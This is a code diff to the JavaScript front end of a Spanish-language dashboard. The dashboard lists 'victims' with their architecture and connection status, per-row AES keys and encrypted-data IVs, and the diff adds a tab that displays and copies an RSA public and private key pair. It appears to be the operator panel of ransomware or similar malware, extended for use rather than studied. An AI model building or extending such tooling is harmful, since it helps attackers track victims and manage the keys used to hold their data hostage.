@@ -59,6 +59,16 @@ async function refreshData() {
     allData.keys = keysData.data || [];
     allData.encrypted = encryptedData.data || [];
 
+    // Load RSA keys
+    try {
+      const rsaRes = await fetch('/api/rsa-keys');
+      const rsaData = await rsaRes.json();
+      allData.rsa = rsaData;
+    } catch (e) {
+      console.log('Error loading RSA keys:', e);
+      allData.rsa = {};
+    }
+
     renderTable();
   } catch (e) {
     console.error('Error loading data:', e);
@@ -130,9 +140,43 @@ function renderTable() {
     html = renderKeysTable(data);
   } else if (currentTab === 'encrypted') {
     html = renderEncryptedTable(data);
+  } else if (currentTab === 'rsa') {
+    html = renderRSATab(allData.rsa);
   }
 
   container.innerHTML = html;
+}
+
+function renderRSATab(rsaData) {
+  if (!rsaData || !rsaData.publicKey) return '<div class="no-data"><p>No hay claves RSA disponibles</p></div>';
+
+  return `
+    <div style="padding: 20px;">
+      <div style="display:grid; grid-template-columns: 1fr 1fr; gap: 20px;">
+        <!-- Public Key -->
+        <div class="card" style="background:#f8f9fa; padding:20px; border-radius:8px; border:1px solid #e9ecef;">
+          <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:15px;">
+            <h3 style="margin:0; font-size:16px; color:var(--dark);">🔑 Clave Pública RSA</h3>
+            <button onclick="copyToClipboard(\`${rsaData.publicKey}\`)" class="copy-btn">
+              <i class="ph ph-copy"></i> Copiar
+            </button>
+          </div>
+          <pre style="background:#1e1e2d; color:#50cd89; padding:15px; border-radius:6px; overflow:auto; max-height:400px; font-size:11px;">${rsaData.publicKey}</pre>
+        </div>
+
+        <!-- Private Key -->
+        <div class="card" style="background:#f8f9fa; padding:20px; border-radius:8px; border:1px solid #e9ecef;">
+          <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:15px;">
+            <h3 style="margin:0; font-size:16px; color:var(--dark);">🔒 Clave Privada RSA</h3>
+            <button onclick="copyToClipboard(\`${rsaData.privateKey}\`)" class="copy-btn">
+              <i class="ph ph-copy"></i> Copiar
+            </button>
+          </div>
+          <pre style="background:#1e1e2d; color:#f64e60; padding:15px; border-radius:6px; overflow:auto; max-height:400px; font-size:11px;">${rsaData.privateKey}</pre>
+        </div>
+      </div>
+    </div>
+  `;
 }
 
 function getSortIcon(column) {
@@ -155,6 +199,7 @@ function renderVictimsTable(data) {
           <th onclick="handleSort('arch')" style="cursor:pointer;">Arch ${getSortIcon('arch')}</th>
           <th onclick="handleSort('status')" style="cursor:pointer;">Estado ${getSortIcon('status')}</th>
           <th onclick="handleSort('created_at')" style="cursor:pointer;">Fecha ${getSortIcon('created_at')}</th>
+          <th>Acciones</th>
         </tr>
       </thead>
       <tbody>
@@ -168,6 +213,14 @@ function renderVictimsTable(data) {
             <td>${row.arch || '-'}</td>
             <td class="${row.status === 'connected' ? 'status-connected' : 'status-disconnected'}">${row.status || '-'}</td>
             <td>${formatDate(row.created_at)}</td>
+            <td>
+              <button class="action-btn edit" onclick="alert('Editar no implementado')" title="Editar">
+                <i class="ph ph-pencil-simple"></i>
+              </button>
+              <button class="action-btn delete" onclick="alert('Eliminar no implementado')" title="Eliminar">
+                <i class="ph ph-trash"></i>
+              </button>
+            </td>
           </tr>
         `).join('')}
       </tbody>
@@ -199,6 +252,12 @@ function renderKeysTable(data) {
             <td>
               <button onclick="copyToClipboard('${row.aes_key}')" class="copy-btn" title="Copiar clave">
                 <i class="ph ph-copy"></i>
+              </button>
+              <button class="action-btn edit" onclick="alert('Editar no implementado')" title="Editar">
+                <i class="ph ph-pencil-simple"></i>
+              </button>
+              <button class="action-btn delete" onclick="alert('Eliminar no implementado')" title="Eliminar">
+                <i class="ph ph-trash"></i>
               </button>
             </td>
           </tr>
@@ -236,6 +295,12 @@ function renderEncryptedTable(data) {
             <td>
               <button onclick="copyToClipboard('${row.iv}')" class="copy-btn" title="Copiar IV">
                 <i class="ph ph-copy"></i>
+              </button>
+              <button class="action-btn edit" onclick="alert('Editar no implementado')" title="Editar">
+                <i class="ph ph-pencil-simple"></i>
+              </button>
+              <button class="action-btn delete" onclick="alert('Eliminar no implementado')" title="Eliminar">
+                <i class="ph ph-trash"></i>
               </button>
             </td>
           </tr>
